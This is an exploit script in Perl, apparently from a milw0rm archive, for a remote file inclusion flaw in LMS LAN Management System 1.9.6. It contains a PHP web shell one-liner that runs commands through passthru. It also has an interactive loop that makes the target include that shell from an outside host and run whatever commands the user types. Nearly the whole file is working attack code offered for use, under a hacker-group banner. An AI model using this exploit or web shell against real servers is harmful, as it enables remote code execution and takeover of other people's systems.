#!/usr/bin/perl
#
# LMS - LAN Management System 1.9.6 - RFI
#
# Risk : High (Remote Code Execution)
#
# Url: http://www.lms.org.pl/download/1.9/lms-1.9.6.tar.gz
#
# Exploit:
#   http://site.com/[path]/lib/language.php?_LIB_DIR=[Evil_Script]
#
# (c)oded and f0und3d by Kw3[R]Ln <office[at]rosecuritygroup[dot]net>
#
# Romanian Security Team .: hTTp://RSTZONE.NET :.
#
#
# greetz to all RST [rstzone.net] MEMBERZ, Nemessis, Slick, str0ke, SpiridusuCaddy, zbeng, ENCODED, # Death, Ciupercutza [LUV TEAM] and all i forgot !
#
# Fuckz: GM [h4cky0u] -[bigest nub]

use LWP::Simple;

print "...........................[RST]...............................\n";
print ".                                                             .\n";
print ".        LMS - LAN Management System 1.9.6 - RFI              .\n";
print ".                                                             .\n";
print "...............................................................\n";
print ".       Romanian Security Team -> hTTp://RSTZONE.NET          .\n";
print ".       [c]oded by Kw3rLN - office@rosecuritygroup.net        .\n";
print "...............................................................\n\n";

my $kw3,$path,$shell,$conexiune,$cmd,$data ;


if ((!$ARGV[0]) || (!$ARGV[1])) { &usage;exit(0);}

$path = $ARGV[0];
chomp($path);
$shell = $ARGV[1];
chomp($shell);

$path = $path."/lib/language.php";


sub usage(){
       print "Usage    : perl $0 host/path http://site.com/cmd.txt\n\n";
       print "Example  : perl $0 http://127.0.0.1 http://site.com/cmd.txt\n\n";
       print 'Shell    : <?php ob_clean();ini_set("max_execution_time",0);passthru($_GET["cmd"]);die;?>';
          }

while ()
{
print "[kw3rln].[rst] :~\$ ";
chomp($cmd=<STDIN>);
if ($cmd eq "exit") { exit(0);}

$kw3 = $path."?_LIB_DIR=".$shell."?&cmd=".$cmd;
if ($cmd eq "")
 { print "Enter your command !\n"; }
else
 { $data=get($kw3); print $data ; }
}

# milw0rm.com [2007-06-20]
